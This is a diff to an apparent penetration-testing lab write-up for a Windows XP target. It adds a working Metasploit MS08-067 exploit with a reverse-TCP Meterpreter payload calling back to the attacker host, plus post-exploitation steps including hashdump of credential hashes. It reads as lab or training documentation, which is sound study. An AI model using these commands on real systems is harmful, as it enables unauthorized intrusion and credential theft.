@@ -245,10 +245,11 @@ Example output: **3389/tcp open** (`ssl/ms-wbt-server`), **`ssl-date`** / **cloc
 | **Open ports (from host table)** | **139, 445** (SMB), RDP likely given Nessus |
 | **Nessus highlights** | **Unsupported XP** (critical), **SMB** issues, **RDP** MiTM class, many **info** SMB/plugin rows |
 | **SMB null enum (this run)** | **`enum4linux -a`** — **no NetBIOS reply** from **`10.20.160.100`**; **`Server doesn't allow session using username '', password ''`** — remainder of tests aborted ([`100-001`](../Screenshots/100-001_enum4linux_null_session_denied_no_nbtstat_tm6_afrocha.png)). Do **not** assume **null SMB** works until **`nmap`** shows **137/139/445** reachable and **`smbclient -L -N`** / **CME** agree. |
+| **Shell (validated)** | **`exploit/windows/smb/ms08_067_netapi`** → **Meterpreter** — fingerprint **Windows XP SP3** (English), **`LHOST`** lab IP — [`100-003`](../Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png). **Wrong lane:** **`ms17_010_eternalblue`** targets **Win7/2008 R2** pool layouts; use **`ms08_067`** on **XP** when **`check`** / **`nmap`** match. |
 
 ### Vulnerabilities (brief)
 
-- **EOL OS** — huge unpatched surface; **SMBv1** era bugs (MS08-067, MS17-010) *may* apply depending on service pack and lab image.
+- **EOL OS** — huge unpatched surface; **SMBv1** era bugs (**MS08-067** on **XP**, **MS17-010** on **7/2008 R2**) *may* apply depending on service pack and lab image.
 - **RDP** — weak creds or known lab passwords.
 - **SMB** — share enumeration and pipe abuse **with creds** or after a **positive vuln check**; **null session** is **not** confirmed on this host (see table above).
 
@@ -284,24 +285,42 @@ set RHOSTS 10.20.160.100
 run
 
 use exploit/windows/smb/ms08_067_netapi
-# OR (if SP/build matches MS17-010 positive check):
-# use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 10.20.160.100
-set LHOST <KALI_IP>
+set LHOST <KALI_LAB_IP>
 set payload windows/meterpreter/reverse_tcp
+set LPORT 4444
 check
+run
 ```
+
+**XP vs EternalBlue:** Prefer **`ms08_067_netapi`** when **`nmap` / MSF** fingerprint **XP SP0–3** (see [`100-003`](../Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png)). Reserve **`ms17_010_eternalblue`** for **Windows 7 / Server 2008 R2** and set **`show targets`** to match **x64** vs **x86** — do not leave **Target 0** (Win7 x64) on an **XP** host.
 
 **MSF MS17-010 `check` and “timed out … `:135`”:** The checker uses **SMB (`445`)** but may also probe **MS-RPC (`135`)**. A **timeout on `135`** means **Kali never got a timely TCP response on that port** — often **XP / host firewall rules**, **lab ACLs** between subnets, **intermittent loss**, or a **busy/slow target**. It is **not** fixed by changing **`LHOST`**. **Mitigations:** (1) **`nmap -Pn -p135,139,445 -sV "$RHOST"`** — if **`135` is filtered/closed**, expect RPC-dependent steps to be flaky. (2) In **`msfconsole`**, raise socket patience, e.g. **`setg ConnectTimeout 60`**, rerun **`check`**, then **`setg ConnectTimeout 10`** when done (restore a sane default). (3) Retry **`check`** or run **`use auxiliary/scanner/smb/smb_ms17_010`** with **`set VERBOSE true`**. (4) A **green “vulnerable”** line can still appear while a **red `135` timeout** logs beside it — **`run`** may succeed or fail for **other** reasons (arch, groom, patch); capture full **`run`** output. See [`100-002`](../Screenshots/100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png).
 
-**4 — Proof files (same pattern as other hosts).**
+**4 — With Meterpreter open (`meterpreter >`):**
 
 ```text
+meterpreter > sysinfo
 meterpreter > getuid
+meterpreter > ipconfig
+meterpreter > pwd
+meterpreter > getprivs
+meterpreter > screenshot
+# Flags / proof (adjust paths per rubric):
+meterpreter > search -f proof.txt
+meterpreter > search -f local.txt
 meterpreter > shell
-C:\> hostname && whoami
+C:\> hostname
+C:\> whoami
+C:\> cd \
 C:\> dir /s /b proof.txt 2>nul & dir /s /b local.txt 2>nul
+C:\> exit
+meterpreter > hashdump
+meterpreter > background
+msf5 > sessions -l
 ```
+
+**Stability:** Prefer **`getuid` / `sysinfo` / `screenshot`** before heavy **`hashdump`** or **`migrate`** (can bluescreen **XP**). **`exit`** in **`shell`** returns to **`meterpreter`**.
 
 ### Evidence (`100-NNN_*` — chronological for this host)
 
@@ -309,6 +328,7 @@ C:\> dir /s /b proof.txt 2>nul & dir /s /b local.txt 2>nul
 |---|------|----------------|
 | **100-001** | [`100-001_enum4linux_null_session_denied_no_nbtstat_tm6_afrocha.png`](../Screenshots/100-001_enum4linux_null_session_denied_no_nbtstat_tm6_afrocha.png) | **`enum4linux -a 10.20.160.100`** — **no nbtstat reply**, **null** **`''`/`''`** session **not allowed** — standard anonymous SMB enum **blocked** on this run |
 | **100-002** | [`100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png`](../Screenshots/100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png) | **`ms17_010_eternalblue` → `check`** — **`[-] … timed out … :135`** alongside **`[+] … likely VULNERABLE`** / **target is vulnerable** (RPC path flaky; see MSF note above) |
+| **100-003** | [`100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png`](../Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png) | **`ms08_067_netapi`** **`run`** — **XP SP3** (English) — **Meterpreter session** **`10.20.150.106:4444` → `10.20.160.100`** |
 
 ---
 
